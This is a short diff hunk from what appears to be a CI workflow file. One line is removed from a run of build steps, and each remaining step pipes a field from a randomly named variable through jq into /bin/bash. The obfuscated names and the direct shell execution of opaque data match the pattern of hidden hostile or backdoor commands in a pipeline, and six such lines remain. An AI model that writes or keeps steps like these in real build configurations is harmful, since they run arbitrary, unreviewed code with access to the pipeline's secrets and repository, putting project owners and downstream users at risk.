@@ -42,7 +42,6 @@ jobs:
           echo $tiq38 | jq -r .zkpb57923 | /bin/bash
           echo $vy53662 | jq -r .tj8475 | /bin/bash
           echo $h3475 | jq -r .v2 | /bin/bash
-          echo $wpdsf86496 | jq -r .y71 | /bin/bash
           printf '%s' "$dxd2769" | jq -r .d75 | /bin/bash
           echo $nbmtu438 | jq -r .xcn1596 | /bin/bash
           echo $tojr0 | jq -r .k53 | /bin/bash
